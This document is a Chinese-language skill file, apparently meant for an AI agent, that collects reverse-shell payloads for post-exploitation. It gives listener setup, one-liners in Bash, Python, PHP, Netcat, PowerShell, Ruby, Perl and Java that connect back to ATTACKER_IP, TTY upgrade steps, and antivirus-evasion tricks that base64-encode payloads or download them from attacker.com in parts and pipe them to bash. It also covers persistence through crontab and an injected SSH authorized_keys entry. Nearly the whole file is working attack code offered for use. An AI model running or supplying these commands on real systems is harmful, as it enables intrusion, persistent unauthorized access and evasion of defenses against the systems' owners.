---
name: reverse-shell
description: 反弹Shell生成和使用，支持多种语言和平台的反弹Shell payload
---

# 反弹 Shell 技能

生成和使用各种反弹 Shell，用于后渗透阶段维持访问。

## 监听端设置

先在攻击机启动监听：
```bash
# 使用 netcat
nc -lvnp 4444

# 使用 socat (更稳定)
socat TCP-LISTEN:4444,reuseaddr,fork -

# 使用 metasploit
msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

## 反弹 Shell Payload

### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```php
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat
```bash
# 传统 netcat
nc ATTACKER_IP 4444 -e /bin/bash

# 无 -e 参数的版本
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### PowerShell (Windows)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Perl
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Shell 升级

获得初始 shell 后，升级为完整 TTY：

```bash
# Python pty
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 然后按 Ctrl+Z 后台
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash

# 调整窗口大小
stty rows 38 columns 116
```

## 免杀技术

### 编码混淆
```bash
# Base64 编码
echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | base64
# 使用：echo "encoded_string" | base64 -d | bash

# Hex 编码
echo "payload" | xxd -p
```

### 分段执行
```bash
# 将 payload 分成多个部分分别下载执行
curl http://attacker.com/part1 > /tmp/p1
curl http://attacker.com/part2 > /tmp/p2
cat /tmp/p1 /tmp/p2 | bash
```

## 持久化

建立反弹 shell 后，添加持久化机制：
```bash
# Crontab
(crontab -l; echo "*/5 * * * * /tmp/revshell.sh") | crontab -

# SSH 密钥
mkdir -p ~/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

## 使用场景

- 初始访问后建立交互式 Shell
- 文件上传漏洞后执行
- 命令注入点执行
- Web Shell 中执行
- 社会工程学攻击载荷
